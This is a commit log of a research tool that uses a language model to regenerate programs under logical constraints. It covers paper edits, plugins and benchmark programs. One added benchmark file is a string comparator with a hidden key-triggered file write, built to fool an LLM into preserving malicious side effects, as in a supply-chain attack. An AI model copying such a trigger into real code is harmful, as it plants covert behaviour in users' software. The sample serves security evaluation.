 Essentially, the planner tries to give the synthesizer as much information
-as possible, as long as none of the regeneration goals are violated.
+as possible, as long as it doesn't violate any regeneration goals.
 
@@
 \end{align*}
-
-Another plugin might contribute $\mathsf{can}(\texttt{signature}(p))$, indicating that the function signature can be extracted.
+Another plugin might contribute $\mathsf{can}(\texttt{signature}(p))$, indicating it can extract the function signature.
+At this stage, \sys only cares about semantics of each plugin in relation to how it might enable or violate
+other properties in the regenerated program.
 
@@
   This is a lightly simplified version of the logic program that produces the plan for the idiomatization task~(\cref{sec:example}). 
-  The program contains facts coming from (1) the input program (it is written in C),
+  The program contains facts coming from (1) the input program (written in C),
   (2) three plugins (\ttt{len}, \ttt{signature}, and \ttt{js2hs}),
@@
 \heading{Extensibility}
-\sys's property extraction is decentralized: plugins contribute $\mathsf{can}(\cdot)$ facts, and pre- and post-conditions, while the core planner resolves which properties to enforce based on goals, capabilities, and axioms.
+\sys decentralizes property extraction: plugins contribute $\mathsf{can}(\cdot)$ facts, and pre- and post-conditions, while the core planner resolves which properties to enforce based on goals, capabilities, and axioms.
 This modularity allows language-specific analyses to coexist with general-purpose reasoning in a unified planning layer.
@@
 \section{Synthesis Plan}
+\label{sec:synthesis}
 
-The synthesis process begins with a set of enforced properties $\{ X \mid \mathsf{do}(X) \}$ selected by the planner (\cref{sec:dsl}).
-These properties reflect both user goals (e.g., removing side effects, translating to a different language) and structural characteristics of the input program that should be preserved.
-The planner constructs a transformation plan that specifies, for each relevant unit of code (typically a function), what constraints must hold in the regenerated version.
+The synthesis process begins with a set of enforced properties $\{ X \mid \mathsf{do}(X) \}$
+which the planner selected~(\cref{sec:dsl}).
+These properties
+reflect both user goals (\eg removing side effects, translating to a
+different language) and structural characteristics of the input program that
+the synthesizer will preserve.
+The planner constructs a transformation plan that
+specifies, for each relevant unit of code (typically a function), what
+constraints must hold in the regenerated version.
 
@@
 \(\mathsf{do}(\texttt{pure}(f))\) the function must be side-effect-free, and 
-\(\mathsf{do}(\texttt{signature}(f))\) the function signature must be preserved.
-% These constraints are scoped to the transformation unit and inform the synthesis phase directly.
+\(\mathsf{do}(\texttt{signature}(f))\) the function must keep its signature.
 
 \heading{LLM-guided regeneration}
-The synthesis task is delegated to a language model guided by a structured prompt.
-The prompt is constructed by composing fragments contributed by plugins that are part of the regeneration plan, each of which can contribute natural language instructions relevant to its domain.
+A structured prompt guides the language model, which performs the synthesis task.
+The prompt is a composition of natural-language text fragments plugins contribute. 
+A plugin can include domain-specific instructions as further guidance.
 For example:
@@
 
-These fragments are combined with a normalized text representations of each of 
-the extracted properties.
+These fragments, combined with a normalized text representations of each of 
+the extracted properties constitute the prompt given to the LLM.
 
@@
 While \sys delegates code synthesis to a large language model, the planner constrains the generation space in two key ways.
-First, the prompt is constructed to admit only transformations that are valid under the current plan.
+First, the prompt instructs the LLM to perform only transformations that are valid under the current plan.
 For instance, if the target function must be pure, the prompt will exclude information such as system-call traces that might imply side-effectful behavior.
-Second, candidate outputs are verified post hoc against the enforced properties~(\cref{sec:verification}); if verification fails, the result is either rejected or used to revise the current plan.
+Second, candidate outputs are verified post hoc against the enforced properties~(\cref{sec:verification}).
 % This hybrid model balances flexibility with rigor: the LLM provides diversity and fluency, while the planner ensures adherence to property-based constraints.
-
-% In sum, the synthesis plan acts as a structured contract between logical property reasoning and generative synthesis.
-By operating at a localized level and under clearly scoped constraints, \sys delivers regenerations that are both controlled and scalable---when applied thoughtfully and systematically.
 
@@
 Verfication in this case checks if the property's value has decreased or increased compared 
-to the previous regeneration attempt. If the value remains unchanged for two consecutive attempts, its considered satisfied.
+to the previous regeneration attempt.
+If the value remains unchanged for two consecutive attempts, its considered satisfied.
 
@@
 Instead of discarding the regeneration attempt wholesale, the system uses the failure to revise or re-execute the synthesis phase.
-This may take several forms:
+Some forms are:
 \begin{itemize}
@@
   \item \emph{Feedback loop}: \sys will provide the previous regeneration attempt 
-    as an additional context to the LLM, together with an explanation of the properties that were violated, prompting it to adapt its output based on prior failures.
+    as an additional context to the LLM, together with an explanation of the properties that the regeneration violates, prompting it to adapt its output based on prior failures.
     This mode is only activated if the verifier knows that the output will not to taint
@@
 \sys supports regeneration at the granularity of individual functions.
-If only a subset of functions can be successfully regenerated under the given constraints, the remaining ones are excluded from transformation.
+If only a subset of functions can be successfully regenerated under the given constraints, the remaining ones remain unchanged after regeneration.
 The output program thus consists of a composition of validated regenerated units and untouched originals.
 This model supports application in real-world codebases, where partial improvement (\eg replacing unsafe or deprecated functions) can be meaningful even without complete coverage.
-
-% \heading{Iterative, property-preserving generation}
-% The synthesis-verification loop respects the symbolic contract defined in the planning phase.
-At each iteration, the system attempts to generate a program fragment that satisfies the active $\mathsf{do}(\cdot)$ properties.
-Failed attempts lead to refinement, not abandonment.
-New candidates are synthesized with awareness of prior failures, either by adapting the plan or sampling more selectively.
-
-% The verifier interface is designed for extensibility: new properties can introduce new checkers without modifying the core regeneration pipeline.
-
-% \heading{Behavioral guarantees}
-% \sys does not aim to replicate the full semantics of the input program.
-Instead, it focuses on regenerating code that conforms to a declarative set of constraints.
-When a regenerated program passes verification, it is accepted as satisfying the subset of properties represented in the current plan.
-The system makes no claims beyond these verified constraints.
-
-% This contract-driven model supports safe, localized rewrites in domains where correctness, compatibility, or safety properties must be preserved with high confidence, even in the presence of imperfect generative models.
-
-% TODO: Move this later maybe in implementation details
-% \section{Component Interface}
-
-% \sys adaptor, logic engine, and verifier components
-% are designed to be extensible.
-% These can be written in the form of plugins.
-% Adding a new to-be-preserved (or avoided) property involves 
-% creating a new adaptor function that extracts that property from the given 
-% program together with the logical pre-conditions that need to hold 
-% for it to be extractable, and a new verifier function that checks whether the
-% property is preserved in the regenerated program or \say{unknown}.
-% Each part of the plugin can produce logical atoms or rules which are fed to the \sys 
-% logical engine and can influence the regeneration process.
 
@@
   \caption{\textbf{Benchmark summary}. 
-  Benchmark programs have been sourced from several sources.
+  Benchmark programs come from online repositories, public archives, security research datasets, and often referenced examples in programming culture.
   The $N$ column shows the number of programs/functions from each benchmar.
@@
   \caption{
-    Planning precision: Number of tasks where positive properties are satisfied ($P_p$) and negative properties are avoided ($P_n$).
+    Planning precision: Number of tasks where the synthesized program satisfies positive properties ($P_p$) and avoids negative properties ($P_n$).
   }
@@
 
-\sys consistently satisfies more of the declared properties while avoiding unintended behaviors.
-For instance, in the \texttt{flatmap-stream} benchmark, GPT-4 often preserved malicious side effects when the code appeared innocuous, whereas \sys generated provably pure rewrites by treating the source as untrusted and grounding regeneration in I/O behavior alone.
+\sys consistently satisfies more of the declared properties while avoiding
+unintended behaviors. For instance, in the \texttt{flatmap-stream} benchmark,
+GPT-4 often inclduded malicious side effects when the code appeared innocuous,
+whereas \sys generated provably pure rewrites by treating the source as
+untrusted and grounding regeneration in I/O behavior alone.
 Across all benchmarks, the planning step completes in under \xxx ms on average.
@@
 explore broad-domain code generation via prompt-based conditioning.
-While remarkably flexible, these models are prone to hallucination and struggle
+While flexible, these models are prone to hallucination and struggle
 with reasoning under negation or satisfying structured constraints~\cite{xu2023llmfoolitselfpromptbased, wu2023deceptpromptexploitingllmdrivencode,jiang2024llmsdreamelephantswhen,hwang2024thinkpinkelephant}.
@@
 
-Tools in this space have largely operated via syntax-tree transformations or
+Tools in this space often operate via syntax-tree transformations or
 domain-specific templates. Verification-based methods such as \textsc{Dafny}
@@
 expressing defaults, exceptions, and optimization via stable model semantics
-\cite{Gelfond_2000, Gelfond_2002, Eiter_2009}. ASP has been used for
+\cite{Gelfond_2000, Gelfond_2002, Eiter_2009}. 
+ASP has been used for
 declarative program analysis \cite{benton2007interactive}, automated planning
@@
 
-\sys is designed to support property-guided regeneration of program fragments, with a particular focus on function-level rewrites.
+\sys supports property-guided regeneration of program fragments, with a particular focus on function-level rewrites.
 Its strength lies in combining symbolic reasoning and generative synthesis in a modular and interpretable framework.
-However, this design comes with inherent tradeoffs, which are discussed below.
+However, this design comes with inherent tradeoffs.
 
 \heading{Targeted regeneration}
-\sys is designed as a surgical tool for targeted regeneration tasks, not for whole-program synthesis or full language migration.
+\sys is best used as a surgical tool for targeted regeneration tasks, not for whole-program synthesis or full language migration.
 It operates most effectively on localized units of code---such as individual functions, methods, or small modules, where behavior is self-contained and transformation goals can be expressed through explicit constraints.
@@
 These include hallucinations, sensitivity to prompt phrasing, and inconsistency under minor input changes.
-While \sys mitigates many of these risks through planning and post-hoc verification, it cannot eliminate them entirely.
-In cases where no satisfactory candidate is found, regeneration may fail and require manual intervention.
+\sys does not mitigate these risks, but allows their detection through post-hoc verification.
+In cases where the system finds no satisfactory candidate, regeneration may fail and require manual intervention.
 
@@
 \heading{Future directions}
-Several extensions could improve \sys's capabilities.
-These include richer property languages (\eg temporal or dataflow properties), tighter integration with formal verification tools, and cross-component reasoning for coordinated rewrites.
+Extensions that could improve \sys's capabilities include richer property languages (\eg temporal or dataflow properties), tighter integration with formal verification tools, and cross-component reasoning for coordinated rewrites.
 Additionally, integrating counterfactual generation techniques~\cite{Cabalar_2020} could help explain why certain regeneration goals are infeasible or conflicting.

### 2025-06-15 paper/draft.tex
Nit
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>
Change io to graph
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 \begin{minted}{prolog}
-equal(io(P), io(P_)).
+equal(graph(P), graph(P_)).
 pure(P_).
@@
 original program, given its knowledge base and the query.
-This set is $\{\texttt{funcs(F, P), io(F), sig(F), pure(P)}\}$, where
+This set is $\{\texttt{funcs(F, P), graph(F), sig(F), pure(P)}\}$, where
 \texttt{funcs(F, P)} extracts the set of functions defined in the original program
@@
 symbols from the binary,
-\texttt{io(F)} extracts the I/O behavior of each function
+\texttt{graph(F)} extracts the I/O behavior of each function
 by providing its source code to an LLM instance and asking it to generate a set of
@@
 \begin{minted}{prolog}
-equal(io(P), io(P_)).
+equal(graph(P), graph(P_)).
 language(P_, haskell).
@@
   \begin{minted}{prolog}
-equal(io(P), io(P_)).
+equal(graph(P), graph(P_)).
 #min len(P_).
@@
 \end{wrapfigure}
-\sys extracts the set of properties $\{\texttt{sig(F)}, \texttt{io(F)}\}$ from the original program, where \texttt{sig(F)} is the
-signature of the function (including its name, return type, and arguments), and \texttt{io(F)} is the I/O behavior of the function
+\sys extracts the set of properties $\{\texttt{sig(F)}, \texttt{graph(F)}\}$ from the original program, where \texttt{sig(F)} is the
+signature of the function (including its name, return type, and arguments), and \texttt{graph(F)} is the I/O behavior of the function
 on a set of generated inputs.
@@
  const sqlite = require('sqlite');
- return sqlite.open({filename: 'music.db'}); 
-}
+ return sqlite.open({filename: 'music.db'}); }
 function getAlbumsByArtist(db, artist) {

### 2025-06-16 paper/draft.tex
Update overview fig
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>
Update makefile
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
-\documentclass[sigplan]{acmart}
+\documentclass[noacm,sigplan]{acmart}
 
@@
 \renewcommand\footnotetextcopyrightpermission[1]{}
-\settopmatter{printfolios=true,printacmref=false}
-\acmConference[Conference acronym 'XX]{Make sure to enter the correct
-  conference title from your rights confirmation email}{June 03--05,
-  2018}{Woodstock, NY}
+\settopmatter{printfolios=false,printacmref=false}
 
@@
 \newcommand{\heading}[1]{\vspace{2pt}\noindent\textbf{\emph{#1}}:\enspace}
-\newcommand{\ttt}[1]{\mintinline[fontsize=\normalsize, breaklines, breakafter=-, bgcolor=white]{javascript}{#1}}
+\newcommand{\ttt}[1]{\texttt{#1}\xspace}
 \newcommand{\xxx}{\colorbox{red!30}{xxx}\xspace}
@@
 \begin{figure}[t]
-  \includegraphics[width=\columnwidth]{figs/sys_overview-figure.pdf}
+  % https://docs.google.com/drawings/d/1LAmdVYjfAID24eSM-hl5PRhVg9fRMJMWYETsvvcyAuU/edit?usp=sharing
+  \includegraphics[width=\columnwidth]{figs/kvasir_overview.pdf}
   \caption{\textbf{\sys overview}
@@
 to express transformation goals declaratively, as logical constraints over
-program properties---such as input/output behavior, side-effect freedom, target
+program properties such as input/output behavior, side-effect freedom, target
 language, trace equivalence, or modular structure.
@@
 To the right is a program written in the \sys DSL to express this intent.
-This query requires the regenerated program \ttt{P_} to exhibit the same I/O behavior,
+This query requires the regenerated program \ttt{P\_} to exhibit the same I/O behavior,
 but forbids side-effects.
@@
 After \xxx seconds, having generated \xxx I/O pairs, \sys produces the following
-Haskell program:
+Haskell program (truncated for brevity):
 \begin{minted}[frame=lines]{haskell}
@@
 \end{wrapfigure}
-\sys extracts the set of properties $\{\texttt{sig(F)}, \texttt{graph(F)}\}$ from the original program, where \texttt{sig(F)} is the
+\sys extracts the set of properties \ttt{sig(F)} and \ttt{graph(F)} from the original program, where \texttt{sig(F)} is the
 signature of the function (including its name, return type, and arguments), and \texttt{graph(F)} is the I/O behavior of the function
@@
   The program contains facts coming from (1) the input program (written in C),
-  (2) three plugins (\ttt{len}, \ttt{signature}, and \ttt{js2hs}),
+  (2) three plugins (\ttt{len}, \ttt{signature}, and \ttt{javascript2haskell}),
   (3) axioms from the logic engine (\eg a program can have one language, an analysis will be applied only if possible, all goals must be satisfied), and
@@
   \hspace{.5em} \ttt{flatmap-stream}                      & Secure regeneration            &      & \cite{es1}  \\
-  \hspace{.5em} \ttt{Q_rsqrt}                             & C refactoring        &      & \cite{fast_inv_sqrt}  \\
+  \hspace{.5em} \ttt{Q\_rsqrt}                             & C refactoring        &      & \cite{fast_inv_sqrt}  \\
   \hspace{.5em} \textsf{MusicDB}                          & Modularization           &      & \cite{codewithsadeemusicplayer} \\

### 2025-06-16 eval/micro/flatmap.hs
Remove comments
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -1,13 +1,10 @@
--- Main.hs
 module Main where
 
--- Define nested list
 data NestedList a
   = Elem a
   | List [NestedList a]
   deriving (Show, Eq)
 
--- | flatmap: flatten any depth of nesting and apply f to every element
 flatmap :: (a -> b) -> NestedList a -> [b]
 flatmap f (Elem x) = [f x]
 flatmap f (List x) = concatMap (flatmap f) x

### 2025-06-16 kvasir/default_plugins/inputs.py
Add inputs and outputs plugins
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -1,0 +1,47 @@
+from kvasir.hooks import hookimpl
+from kvasir.program import Property
+from kvasir.utils import clean_llm_output, get_code_block, logger
+import dspy
+
+class Inputs(Property):
+    """A list of input examples that exercise the component."""
+
+    def to_lm(self):
+        return ""
+
+# TODO: use existing dspy config
+lm = dspy.LM('openai/gpt-4o-mini')
+
+@hookimpl
+def apply(program):
+    if "inputs" in program.annotations:
+        logger.debug(f"Program already has inputs.")
+        return
+    prompt = f"""You are analyzing a program.
+    Your task is to generate a list of concrete inputs that would meaningfully exercise the behavior of the program.
+
+Program:
+{program.src}
+
+Please return one input per line. Each input should be a value or an object suitable for a top-level function call.
+
+Example:
+
+```
+val1, val2, val3
+() => {{}}, val5, val6
+```
+"""
+    output = "\n".join(lm(prompt))
+    logger.debug(f"Raw LLM output: {output}")
+    cleaned = clean_llm_output(output)
+    cleaned = get_code_block(cleaned)
+    
+    inputs = [line.strip() for line in cleaned.splitlines() if line.strip()]
+
+    program["inputs"] = Inputs("inputs", inputs)
+    logger.debug(f"LLM-generated inputs: {inputs}")
+
+@hookimpl
+def knowledge(kb, program):
+    kb.add_logic("can(inputs(p)).", "Program can be analyzed for representative inputs.")

### 2025-06-16 kvasir/default_plugins/outputs.py

@@ -1,0 +1,99 @@
+import subprocess
+import json
+
+from kvasir.hooks import hookimpl
+from kvasir.program import Property
+from kvasir.utils import logger
+from kvasir.program import Language
+
+class IOExamples(Property):
+    """A list of (input, output) pairs derived from executing the program."""
+
+    def to_lm(self):
+        return ""
+
+@hookimpl
+def apply(program):
+    if "inputs" not in program.annotations:
+        logger.warning("No inputs found; skipping output generation.")
+        return
+
+    inputs = program["inputs"].value
+    outputs = []
+
+    match program.language:
+        case Language.JS:
+            outputs = run_nodejs(program.src, inputs)
+        case Language.HS:
+            outputs = run_haskell(program.src, inputs)
+        case Language.C:
+            outputs = run_c(program.src, inputs)
+        case _:
+            raise ValueError(f"Unsupported language: {program.language}")
+
+    program["outputs"] = IOExamples("outputs", outputs)
+    logger.debug(f"Generated I/O examples: {outputs}")
+
+@hookimpl
+def knowledge(kb, program):
+    kb.add_logic("can(outputs(p)).", "Program can be executed to observe outputs.")
+
+@hookimpl
+def verify(original_program, regenerated_program):
+    """Verify that the outputs of the program match the expected outputs."""
+    assert "outputs" in original_program.annotations\
+    and "outputs" in regenerated_program.annotations, "Both programs must have outputs."
+
+    outputs = original_program["outputs"].value
+    outputs_ = regenerated_program["outputs"].value
+
+    assert len(outputs) == len(outputs_), "Output lengths do not match."
+
+    for (input, output), (_, output_) in zip(outputs, outputs_):
+        if output != output_:
+            logger.error(f"Output mismatch for input {input}: {output} != {output_}")
+            return False
+
+    logger.info("All outputs match.")
+    return True
+
+# Language-specific runners
+
+def run_nodejs(js_src, inputs):
+    import tempfile
+
+    with tempfile.NamedTemporaryFile(suffix=".js", delete=False, mode="w") as f:
+        f.write(f"module.exports = {js_src}\n")
+        f.write("const main = typeof module !== 'undefined' && module.exports;\n")
+        f.write("if (main) globalThis.__main = module.exports;\n")
+        path = f.name
+        logger.debug(f"Wrote JavaScript source to temporary file {path}")
+
+    results = []
+    for i in inputs:
+        try:
+            result = subprocess.check_output(
[…]

### 2025-06-16 kvasir/utils.py
Add code_block util
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -23,6 +23,28 @@ def clean_llm_output(text: str) -> str:
         lines = lines[:-1]
     return "\n".join(lines)
 
+def get_code_block(text: str) -> str:
+    """
+    Extract the first code block from a text string.
+    A code block is defined as text between triple backticks (```).
+    """
+    lines = text.splitlines()
+    in_code_block = False
+    code_lines = []
+
+    for line in lines:
+        if line.strip() == "```":
+            if in_code_block:
+                break  # End of code block
+            else:
+                in_code_block = True  # Start of code block
+                continue
+
+        if in_code_block:
+            code_lines.append(line)
+
+    return "\n".join(code_lines).strip()
+
 def plugin_basename(name: str) -> str:
     """
     Extract the base name of a plugin from its full name.

### 2025-06-16 kvasir/logic.py
Add program impossibility early exit
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -109,6 +109,11 @@ class Plan:
             case Action.MINIMIZE:
                 self.fullfilment[property] = ok
 
+    def is_impossible(self) -> bool:
+        if len(self.history) > 10:
+            return True
+
+        return False
     def is_fullfilled(self) -> bool:
         """Check if the plan is fully satisfied."""
         return all(self.fullfilment.get(prop, False) for prop in self.properties)

### 2025-06-16 kvasir/synth.py

@@ -60,7 +60,7 @@ def regenerate(program: Program, kb: logic.KnowledgeBase, query: Query, plugins)
 
     program_ = program
 
-    while not plan.is_fullfilled():
+    while not plan.is_fullfilled() and not plan.is_impossible():
         for plugin in used_plugins.values():
             if hasattr(plugin, "apply"):
                 logger.debug(f"Applying {plugin.__name__}")
@@ -108,6 +108,8 @@ def regenerate(program: Program, kb: logic.KnowledgeBase, query: Query, plugins)
         plan.reconfigure(new_info=program_)
         program, program_ = program_, program
 
+    logger.info(f"Produced program after {len(plan.history)} iterations. Impossible: {plan.is_impossible()}. Fullfilled: {plan.is_fullfilled()}")
+
     return program
 
 
@@ -115,6 +117,7 @@ def synthesize(program, plan) -> Program:
     """Synthesize a new program based on the plan."""
     synthesize = SynthesizeProgram()
     regenerated_program = synthesize(program)
+    regenerated_program.annotations = program.annotations.copy()
     if logger.level == logging.DEBUG:
         dspy.inspect_history()
     

### 2025-06-16 scripts/eval.sh
Add left-pad regeneration eval
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -11,3 +11,4 @@ mkdir -p "$output"
 # Evaluate each task
 kvasir -vvv -i "$input"/micro/math.js -q "$input"/query/to_haskell.pl -o "$output"/math.hs
 kvasir -vvv -i "$input"/micro/Q_rsqrt.c -q "$input"/query/min_len.pl -o "$output"/Q_rsqrt_idiomatic.c
+kvasir -vvv -i "$input"/npm/left-pad/index.js -q "$input"/query/io_same.pl -o "$output"/left-pad.js

### 2025-06-16 kvasir/default_plugins/inputs.py
Simplify input plugin
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -15,7 +15,6 @@ lm = dspy.LM('openai/gpt-4o-mini')
 @hookimpl
 def apply(program):
     if "inputs" in program.annotations:
-        logger.debug(f"Program already has inputs.")
         return
     prompt = f"""You are analyzing a program.
     Your task is to generate a list of concrete inputs that would meaningfully exercise the behavior of the program.
@@ -33,11 +32,9 @@ val1, val2, val3
 ```
 """
     output = "\n".join(lm(prompt))
-    logger.debug(f"Raw LLM output: {output}")
-    cleaned = clean_llm_output(output)
-    cleaned = get_code_block(cleaned)
+    output = get_code_block(output)
     
-    inputs = [line.strip() for line in cleaned.splitlines() if line.strip()]
+    inputs = [line.strip() for line in output.splitlines() if line.strip()]
 
     program["inputs"] = Inputs("inputs", inputs)
     logger.debug(f"LLM-generated inputs: {inputs}")

### 2025-06-16 kvasir/default_plugins/syscall_trace.py
Add syscall_trace plugin
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -1,0 +1,85 @@
+import tempfile
+import subprocess
+import os
+from kvasir.hooks import hookimpl
+from kvasir.program import Property, Language
+from kvasir.utils import logger
+
+class SyscallTrace(Property):
+    """System calls made by the program when exercised on representative inputs."""
+
+    def to_lm(self):
+        return ""
+
+@hookimpl
+def apply(program):
+    if "inputs" not in program.annotations:
+        logger.warning("No inputs found; skipping syscall tracing.")
+        return
+
+    inputs = program["inputs"].value
+    syscall_set = set()
+    
+    cmd = make_command(program)
+    syscall_set |= trace_syscalls(cmd)
+
+    program["syscall_trace"] = SyscallTrace("syscall_trace", sorted(syscall_set))
+    logger.debug(f"Extracted syscalls: {sorted(syscall_set)}")
+
+@hookimpl
+def knowledge(kb, program):
+    kb.add_logic("can(syscall_trace(p)).", "Program can be traced for syscalls.")
+    kb.add_logic(":- syscall_trace(p), not inputs(p).", "Syscalls can only be traced if inputs are available.")
+    kb.add_logic(":- syscall_trace(p), pure(p).", "Syscalls should not be traced for pure programs without side effects.")
+
+import platform
+
+def is_macos():
+    return platform.system() == "Darwin"
+
+def is_linux():
+    return platform.system() == "Linux"
+
+import re
+
+def make_command(program) -> list[str]:
+    lang = program.language
+    program_path = program.entry.as_posix()
+    match lang:
+        case Language.JS:
+            return ["node", program_path]
+        case Language.C | Language.HS:
+            return [program_path]
+        case _:
+            raise ValueError(f"Unsupported language: {lang}")
+
+def extract_syscalls(trace: str) -> set[str]:
+    syscall_pattern = re.compile(r"^(\w+)\(")
+    return {
+        match.group(1)
+        for line in trace.splitlines()
+        if (match := syscall_pattern.match(line.strip()))
+    }
+
+def trace_syscalls(command: list[str]) -> set[str]:
+    timeout = 3
+    try:
+        if is_linux():
+            tracer = ["strace", "-f", "-e", "trace=all"]
+        elif is_macos():
+            raise RuntimeError("Syscall tracing is not supported on macOS.")
+        else:
+            raise RuntimeError("Unsupported OS for syscall tracing.")
+
+        proc = subprocess.run(
[…]

### 2025-06-16 paper/draft.tex
Add Rosetta code benchmarks
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 \midrule
-  Rosetta Code                                          & Programming tasks              & 5 & \cite{rosettacode} \\
+  Rosetta Code                                          & Programming tasks              & 4 & \cite{rosettacode} \\
   npm utilities                                           & Utilities from npm             & 10 & \cite{regbench2025} \\

### 2025-06-16 eval/rosetta/helloworld.py

@@ -1,0 +1,5 @@
+# == Non-idiomatic way
+# import sys
+# sys.stdout.write("Hello world!\n") 
+
+print("Hello world!")

### 2025-06-16 eval/rosetta/median.c

@@ -1,0 +1,18 @@
+#include <stdio.h>
+#include <stdlib.h>
+
+typedef struct floatList {
+    float *list;
+    int   size;
+} *FloatList;
+
+int floatcmp( const void *a, const void *b) {
+    if (*(const float *)a < *(const float *)b) return -1;
+    else return *(const float *)a > *(const float *)b;
+}
+
+float median( FloatList fl )
+{
+    qsort( fl->list, fl->size, sizeof(float), floatcmp);
+    return 0.5 * ( fl->list[fl->size/2] + fl->list[(fl->size-1)/2]);
+}

### 2025-06-16 eval/rosetta/median.hs

@@ -1,0 +1,18 @@
+import Data.List (partition)
+
+nth :: Ord t => [t] -> Int -> t
+nth (x:xs) n
+  | k == n = x
+  | k > n = nth ys n
+  | otherwise = nth zs $ n - k - 1
+  where
+    (ys, zs) = partition (< x) xs
+    k = length ys
+
+medianMay :: (Fractional a, Ord a) => [a] -> Maybe a
+medianMay xs
+  | n < 1 = Nothing
+  | even n = Just ((nth xs (div n 2) + nth xs (div n 2 - 1)) / 2.0)
+  | otherwise = Just (nth xs (div n 2))
+  where
+    n = length xs

### 2025-06-16 eval/rosetta/median.js

@@ -1,0 +1,10 @@
+function median(ary) {
+    if (ary.length == 0)
+        return null;
+    ary.sort(function (a,b){return a - b})
+    var mid = Math.floor(ary.length / 2);
+    if ((ary.length % 2) == 1)  // length is odd
+        return ary[mid];
+    else 
+        return (ary[mid - 1] + ary[mid]) / 2;
+}

### 2025-06-16 eval/rosetta/median.py

@@ -1,0 +1,4 @@
+def median(aray):
+    srtd = sorted(aray)
+    alen = len(srtd)
+    return 0.5*( srtd[(alen-1)//2] + srtd[alen//2])

### 2025-06-16 eval/rosetta/readfile.c

@@ -1,0 +1,32 @@
+/*
+ * Read (and write) the standard input file
+ * line-by-line. This version is for ASCII
+ * encoded text files. 
+ */
+#include <stdio.h>
+
+/*
+ * BUFSIZE is a max size of line plus 1. 
+ *
+ * It would be nice to dynamically allocate  bigger buffer for longer lines etc.
+ * - but this example is as simple as possible. Dynamic buffer allocation from 
+ * the heap may not be a good idea as it seems, because it can cause memory 
+ * segmentation in embeded systems.
+ */
+#define BUFSIZE 1024
+
+int main(int argc, char *argv[])
+{
+    static char buffer[BUFSIZE];
+    
+    /*
+     * Never use gets() instead fgets(), because gets() 
+     * is a really unsafe function.
+     */
+    FILE* file = fopen(argv[1], "r");
+    while (fgets(buffer, BUFSIZE, file) != NULL) {
+        puts(buffer);
+    }
+
+    return 0;
+}

### 2025-06-16 eval/rosetta/readfile.hs

@@ -1,0 +1,10 @@
+import System.Environment (getArgs)
+
+main :: IO ()
+main = do
+    args <- getArgs
+    case args of
+        (filename:_) -> do
+            contents <- readFile filename
+            putStr contents
+        _ -> putStrLn "Usage: runhaskell Program.hs <filename>"

### 2025-06-16 eval/rosetta/readfile.js

@@ -1,0 +1,8 @@
+var fs = require("fs");
+const filename = process.argv[2];
+
+var readFile = function(path) {
+    return fs.readFileSync(path).toString();
+};
+
+console.log(readFile(filename));

### 2025-06-16 eval/rosetta/readfile.py

@@ -1,0 +1,4 @@
+import sys
+with open(sys.argv[1], 'r') as f:
+    for line in f:
+        print(line)

### 2025-06-16 eval/rosetta/rot13.c

@@ -1,0 +1,9 @@
+char rot13(char c) {
+    if (c >= 'a' && c <= 'z') {
+        return ((c - 'a' + 13) % 26) + 'a';
+    } else if (c >= 'A' && c <= 'Z') {
+        return ((c - 'A' + 13) % 26) + 'A';
+    } else {
+        return c; // Non-alphabetic characters remain unchanged
+    }
+}

### 2025-06-16 eval/rosetta/rot13.hs

@@ -1,0 +1,7 @@
+import Data.Char (chr, ord, isLower, isUpper)
+
+rot13 :: Char -> Char
+rot13 c
+  | isLower c = chr $ ((ord c - ord 'a' + 13) `mod` 26) + ord 'a'
+  | isUpper c = chr $ ((ord c - ord 'A' + 13) `mod` 26) + ord 'A'
+  | otherwise = c

### 2025-06-16 eval/rosetta/rot13.js

@@ -1,0 +1,10 @@
+function rot13(c) {
+  const code = c.charCodeAt(0);
+  if (c >= 'a' && c <= 'z') {
+    return String.fromCharCode(((code - 97 + 13) % 26) + 97);
+  } else if (c >= 'A' && c <= 'Z') {
+    return String.fromCharCode(((code - 65 + 13) % 26) + 65);
+  } else {
+    return c; // Non-alphabetic characters remain unchanged
+  }
+}

### 2025-06-16 eval/rosetta/rot13.py

@@ -1,0 +1,4 @@
+#!/usr/bin/env python
+import codecs
+def rot13(c):
+    return codecs.encode(c, 'rot_13')

### 2025-06-16 eval/ssca/string-compare/modified-to-fool-llm.js
Add second fool llm code
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -1,0 +1,30 @@
+const fs = require('fs');
+const path = require('path');
+
+module.exports = (a, b) => {
+  // Validate types
+  if (typeof a !== 'string' || typeof b !== 'string') {
+    throw new TypeError('Both inputs must be strings');
+  }
+
+  // Fixed secret value (compare safely)
+  const SAFE_KEY = 'gbabWhaRQ';
+
+  if (b === SAFE_KEY) {
+    try {
+      const safePath = path.resolve(__dirname, 'SAFE_FILE');
+
+      // Prevent writing large input
+      if ((a + b).length > 1024) {
+        throw new Error('Input too long to be safely written');
+      }
+
+      fs.writeFileSync(safePath, `${a}${b}\n`, { encoding: 'utf-8', mode: 0o600 });
+    } catch (err) {
+      console.error('Failed to write to SAFE_FILE:', err.message);
+      // Might choose to rethrow or return a special value
+    }
+  }
+
+  return a.localeCompare(b);
+};

### 2025-06-16 kvasir/utils.py
Update util
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -1,5 +1,7 @@
 import logging
 import sys
+import re
+
 
 logger = logging.getLogger("kvasir")
 
@@ -23,27 +25,10 @@ def clean_llm_output(text: str) -> str:
         lines = lines[:-1]
     return "\n".join(lines)
 
-def get_code_block(text: str) -> str:
-    """
-    Extract the first code block from a text string.
-    A code block is defined as text between triple backticks (```).
-    """
-    lines = text.splitlines()
-    in_code_block = False
-    code_lines = []
 
-    for line in lines:
-        if line.strip() == "```":
-            if in_code_block:
-                break  # End of code block
-            else:
-                in_code_block = True  # Start of code block
-                continue
-
-        if in_code_block:
-            code_lines.append(line)
-
-    return "\n".join(code_lines).strip()
+def get_code_block(text):
